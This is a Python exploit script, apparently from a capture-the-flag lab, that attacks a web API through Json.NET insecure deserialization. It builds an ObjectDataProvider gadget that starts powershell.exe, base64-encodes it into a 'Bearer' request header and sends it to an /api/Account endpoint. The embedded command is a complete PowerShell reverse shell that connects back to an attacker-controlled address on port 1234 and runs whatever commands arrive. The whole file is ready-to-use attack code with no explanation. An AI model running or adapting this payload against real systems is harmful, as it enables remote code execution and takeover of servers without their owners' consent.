#!/usr/bin/env python3
import requests
import base64
import json


url = 'http://10.10.10.158/api/Account'
cmd = "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.245',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

payload = {
    '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName': 'Start',
    'MethodParameters': {
        '$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values': ['powershell.exe','-c ' + cmd]
    },
    'ObjectInstance': {'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}

pstr = json.dumps(payload)
enc_payload = str((base64.b64encode(pstr.encode())), 'utf-8')

headers = {
    'Content-Type': 'application/json',
    'Bearer': enc_payload
}

requests.get(url, headers=headers)